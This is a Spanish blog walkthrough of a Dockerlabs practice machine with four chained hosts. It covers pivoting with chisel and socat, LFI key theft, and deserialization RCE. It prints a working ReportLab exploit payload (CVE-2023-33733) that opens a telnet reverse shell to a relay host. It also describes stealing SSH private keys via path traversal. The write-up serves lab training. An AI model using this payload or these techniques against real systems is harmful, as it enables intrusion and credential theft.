---
layout: single
title: Grandma - Dockerlabs
excerpt: "**Grandma** es una máquina clasificada como 'Difícil' en la plataforma Dockerlabs, donde se practica intensamente el **pivoting** y el uso de herramientas como **socat** y **chisel**."
date: 2024-08-17
classes: wide
header:
  teaser: /assets/images/dockerlabs-grandma/grandma-logo.png
  teaser_home_page: true
  icon: /assets/images/dockerlabs.png
categories:
  - dockerlabs
tags:
  - hard
  - linux
  - pivoting
  - tunneling
  - LFI
---

Comenzamos desplegando el laboratorio Grandma, podemos ver que todas maquinas y sus direcciones IP, en algunos casos tienen dos, ya que en este laboratorio practicaremos pivoting y tunneling.

![](/assets/images/dockerlabs-grandma/grandma-1.png)

## Portscan Grandma1
Realizamos los escaneos necesarios, el primero siempre será para determinar los puertos y en el segundo para sacar un poco más de información sobre versiones y más.

![](/assets/images/dockerlabs-grandma/grandma-2.png)

En el segundo escaneo podemos darnos cuenta que el puerto 80 nos redirige a grandma.dl, podemos añadirlo a `/etc/hosts` pero otra cosa interesante es que por el puerto 5000 también tenemos otro servicio web que se ve interesante

![](/assets/images/dockerlabs-grandma/grandma-3.png)

## Analizando los puertos Grandma1
Primero accedimos al puerto 80, pero no alcancé a encontrar nada interesante, probé hacer fuzzing pero tampoco conseguí infomación que pudiera ser muy relevante, unicamente posibles usuarios 'Dr Mario' y 'Dr Zunder'

![](/assets/images/dockerlabs-grandma/grandma-5.png)

![](/assets/images/dockerlabs-grandma/grandma-4.png)

Despues nos fuimos al puerto 5000, investigamos la version de aiohttp, la cual era la 3.9.1 y encontré un [CVE-2024-23334](https://github.com/ox1111/CVE-2024-23334) sobre LFI en el static.

![](/assets/images/dockerlabs-grandma/grandma-6.png)

## Intrusión a Grandma1
Capturamos la petición en burp y probamos el LFI apuntando al `/etc/hosts` y efectivamente drzunder era un usuario del sistema.

![](/assets/images/dockerlabs-grandma/grandma-7.png)

Ahora que sabemos que drzunder existe en el sistema podemos probar el buscar y robar su `id_rsa`, afortunadamente lo conseguimos y podemos intentar logearnos por el puerto 22.

![](/assets/images/dockerlabs-grandma/grandma-8.png)

Le damos los permisos necesarios y obtenemos el acceso, ahi tenemos la primera flag.

![](/assets/images/dockerlabs-grandma/grandma-9.png)

## Pivoting Grandma1
En este laboratorio no podemos escalar privilegios, por lo que va sobre pivoting, asi que primero nos compartiremos socat y chisel a la maquina ya vulnerada **Grandma1**.

![](/assets/images/dockerlabs-grandma/grandma-10.png)

Luego usamos chisel para crear un tunel y redirigir el trafico a nuestra maquina, para poder ver **Grandma2**.

![](/assets/images/dockerlabs-grandma/grandma-11.png)

Abriremos `/etc/proxychains4.conf` con `nano` y añadimos `socks5 127.0.0.1 1080` al final del archivo, ya que es el puerto por el cual se creo el tunel

## Portscan Grandma2
Como observamos al levantar el laboratorio, la ip de Grandma2 es 20.20.20.3, asi que usando proxychains antes del nmap podemos hacer un escaneo rapido, notamos que hay 2 puertos abiertos, a veces el 2222 es usado para el servicio `ssh`, asi que intentaré hacer `whatweb` al puerto 9000, para saber si este cuenta con servicio web.

![](/assets/images/dockerlabs-grandma/grandma-12.png)

![](/assets/images/dockerlabs-grandma/grandma-13.png)

Como era de suponer, por ahi corre un servicio web, asi que accedamos a la web para entenderlo mejor.

## Analizando servicio web Grandma2
Para acceder correctamente al sitio web, necesitamos configurar un nuevo proxy en la extension de burp, especificando el puerto del tunel, la ip localhost y del tipo SOCKS5.

![](/assets/images/dockerlabs-grandma/grandma-14.png)

Una vez dentro encontré esta subida de archivos, pero unicamente recibe archivos con la extension .html y nos convierte a pdf, asi que nos toca capturar la peticion con burp y ver que esta sucediendo por detras

![](/assets/images/dockerlabs-grandma/grandma-15.png)

Pero para capturar la peticion debemos moficar un par de cosas en **Proxy Settings** de **BurpSuite**, en el apartado **Network** seguido de **Connections**, nos desplazamos hasta abajo **SOCKS proxy** y especificamos el puerto del tunel de nuevo y la ip, justo como en el navegador.

![](/assets/images/dockerlabs-grandma/grandma-16.png)

De nuevo nos cambiamos a nuestro proxy de burp normal en el navegador y capturamos la peticion.

![](/assets/images/dockerlabs-grandma/grandma-17.png)

Lo más destacable de la petición es que genera el reporte desde http://reportlab.com

![](/assets/images/dockerlabs-grandma/grandma-18.png)

## Intrusión a Grandma2
Me encontré con el [CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733) que habla de un RCE en reportlab, asi que lo probamos moficando ligeramente el codigo para obtener una reverse shell, pero antes de enviar el payload debemos configurar socat en **Grandma1**.

![](/assets/images/dockerlabs-grandma/grandma-19.png)

Tenemos configurado socat para que toda conexion que reciba por el puerto 1111 sea redirigida hacia el puerto 1234 de la ip 10.10.10.1, que en este caso es mi maquina atacante, donde estoy en escucha por ese puerto, esperando la revshell

![](/assets/images/dockerlabs-grandma/grandma-20.png) #---

Ahora hacemos el envio del payload con la reverse por **telnet**, especificando la ip que tiene conectividad con **Grandma 2** (20.20.20.2) y el puerto 1111 que habiamos puesto en escucha con socat, solo queda esperar la reverse.

```html
<para>
    <font color="[ [ getattr(pow,Attacker('__globals__'))['os'].system('TF=$(mktemp -u);mkfifo $TF && telnet 20.20.20.2 1111 0<$TF | bash 1>$TF') for Attacker in [orgTypeFun('
Attacker', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self:
{setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))]] and 'red'">
    exploit
    </font>
</para>
```

![](/assets/images/dockerlabs-grandma/grandma-21.png)

Una vez con la conexion recibida, exploramos un poco y como sabemos que las conexiones por netcat a veces no son tan estables buscamos de nuevo un `id_rsa` que nos de la posibilidad de acceder de manera sencilla, leemos el `/etc/passwd` y exploramos el usuario app, ahi lo encontramos, basta con copiarlo y pegarlo dentro de **Grandma1** para acceder de manera más simple y segura.

![](/assets/images/dockerlabs-grandma/grandma-22.png)

Una vez con los permisos necesarios entablamos la conexion por ssh especificando el puerto 2222 que anteriormente encontramos y como se esperaba, pudimos acceder sin ningun problema a Grandma2 como usuario app.

![](/assets/images/dockerlabs-grandma/grandma-23.png)

## Pivoting Grandma2
Ahora harémos el siguiente tunnel con `chisel` para poder ver **Grandma3** desde la maquina atacante, necesitamos pasar `chisel` y `socat`  a **Grandma2**, luego ejecutar **chisel**. Pondremos **Grandma1** redirigiendo por `socat`, esperando conexion por el puerto 111 y mandandola al puerto 33 de la atacante donde tenemos `chisel` en escucha.

![](/assets/images/dockerlabs-grandma/grandma-24.png)

Desde **Grandma2** tiramos `chisel` para crear un tunnel con **Grandma1** que anteriormente pusimos en escucha con `socat` por el puerto 111 y le daremos el puerto 7777 que debemos añadir a nuestro proxychains4.conf en la atacante.

![](/assets/images/dockerlabs-grandma/grandma-25.png)

Deberíamos recibir la conexión de la siguiente manera, desde el localhost por el puerto 7777.

![](/assets/images/dockerlabs-grandma/grandma-26.png)

Como se menciono anteriormente, debemos añadir el localhost y el puerto de chisel al `/etc/proxychains4.conf`, pero es sumamente importante ese orden y que dynamic_chain este descomentado pero random_chain comentado, como se muestra en la imagen.

![](/assets/images/dockerlabs-grandma/grandma-27.png)

![](/assets/images/dockerlabs-grandma/grandma-28.png)

## Portscan Grandma3
De igual manera al escaneo de **Grandma2**, aqui obtenemos dos puertos, el 2222 y ahora el 3000, asi que como lo hice anteriormente, ejecuto `whatweb` para saber si corre web y podemos ver que si.

![](/assets/images/dockerlabs-grandma/grandma-29.png)

Configuramos de nuevo **FoxyProxy** pero ahora con el puerto 7777, y entramos a la web.

![](/assets/images/dockerlabs-grandma/grandma-30.png)

## Analizando la web Grandma3
Nos encontramos con una pagina completamente en blanco que al inspeccionarla tampoco encontramos nada, asi que capturamos con burp la peticion para entender que pasa por detrás.

![](/assets/images/dockerlabs-grandma/grandma-31.png)

De la misma manera que modificamos el SOCKS proxy para capturar la peticion de **Grandma2**, lo hacemos con el puerto 7777 para **Grandma3**.

![](/assets/images/dockerlabs-grandma/grandma-32.png)

A primera vista, parece que de igual manera, la pagina no tiene sentido ya que no aparece absolutamente nada, sin embargo estuve capturando un par de peticiones más y noté que la Cookie es distinta siempre, además que parece estar encodeada.

![](/assets/images/dockerlabs-grandma/grandma-33.png)

Esta es otra peticion en la que se muestra otra cookie pero parece estar igual encodeada.

![](/assets/images/dockerlabs-grandma/grandma-34.png)

![](/assets/images/dockerlabs-grandma/grandma-35.png)

Al parecer es un base64, asi que estuve intentando codificar varios comandos a base64 y poniendolos en la cookie a ver si algo cambiaba.

## Intrusión a Grandma3
Usando el decoder de burp intente hacer un LFI desde la cookie, tratando de leer el archivo `/etc/hosts`, primero codificamos la ruta a base64

![](/assets/images/dockerlabs-grandma/grandma-36.png)

Solo me hizo falta modificar la cookie por el encodeado y el contenido se pudo mostrar, asi que intentaré ver los usuarios de **Grandma3**.

![](/assets/images/dockerlabs-grandma/grandma-37.png)

De la misma forma que antes, pero apuntando al `/etc/passwd` logramos mirar `node` como usuario del sistema.

![](/assets/images/dockerlabs-grandma/grandma-38.png)

Como hemos estado haciendo hasta ahora, intenté apuntar al `id_rsa` de este usuario en `../../../../../home/node/.ssh/id_rsa`, y desde el puerto 2222 logramos acceder por ssh, justo como se ve en la imagen.

![](/assets/images/dockerlabs-grandma/grandma-39.png)

## Pivoting Grandma3
Ahora debemos crear el tunnel para poder ver **Grandma3** desde la maquina atacante, siguiendo la misma logica, usamos `socat` en **Grandma2** y `chisel` en **Grandma3**, es **IMPORTANTE** no cerrar ninguna de las conexiones anteriores que hicimos con `socat` o `chisel`.

![](/assets/images/dockerlabs-grandma/grandma-40.png)

Por ultimo solo nos queda esperar la conexión

![](/assets/images/dockerlabs-grandma/grandma-41.png)

Añadimos ahora el puerto 6666 al `/etc/proxychains4.conf` en este orden, que siempre será importante llevar

![](/assets/images/dockerlabs-grandma/grandma-42.png)

## Portscan Grandma4
Ahora al hacer el escanneo de Grandma4 solo encontramos un puerto, el 9999, revisamos con `whatweb` a ver si podemos sacar algo de ahí y vemos el error 405, asi que entramos a la web para entender un poco mejor esto.

![](/assets/images/dockerlabs-grandma/grandma-43.png)

Es siempre importante modificar el **FoxyProxy** para no tener problemas al momento de acceder.

![](/assets/images/dockerlabs-grandma/grandma-44.png)

## Analisis Grandma4
Encontramos que unicamente esta disponible el método **POST**, asi que podemos probar realizar la misma peticion con `curl`

![](/assets/images/dockerlabs-grandma/grandma-45.png)

Al hacer la peticion, se nos listan varios usuarios, con sus **id** y **nombre**, sin embargo en el que parece ser el ultimo hay un **"Command error"**, podriamos aprovecharnos de esto.

![](/assets/images/dockerlabs-grandma/grandma-46.png)

## Intrusión a Grandma4
Notamos que la web esta deserializando el contenido **JSON** de manera insegura, lo que permite ejecutar comandos del sistema operativo a través de un código **JavaScript** inyectado, como el `whoami`.

![](/assets/images/dockerlabs-grandma/grandma-47.png)

Asi que procedemos a intentar una revshell, la logica es ponernos con socat en escucha dentro de **Grandma1**, **Grandma2** y **Grandma3**, al mismo tiempo que esperamos con `nc` en la maquina atacante y enviar el payload , justo como se ve en la imagen.

![](/assets/images/dockerlabs-grandma/grandma-48.png)

Si todo salió bien, debemos obtener la shell sin problema.

![](/assets/images/dockerlabs-grandma/grandma-49.png)

Al recibir la shell noté que ya tenía acceso como `root`, por tanto solo accedemos a su directorio y leemos la flag.

![](/assets/images/dockerlabs-grandma/grandma-50.png)

## Conclusiones
Esto es todo por el momento, la maquina Grandma creada por Pylon, me parecio muy interesante y entretenida ya que pude practicar el pivoting y recordar un poco el uso de herramientas como socat y chisel, me gustó mucho y vamos por más!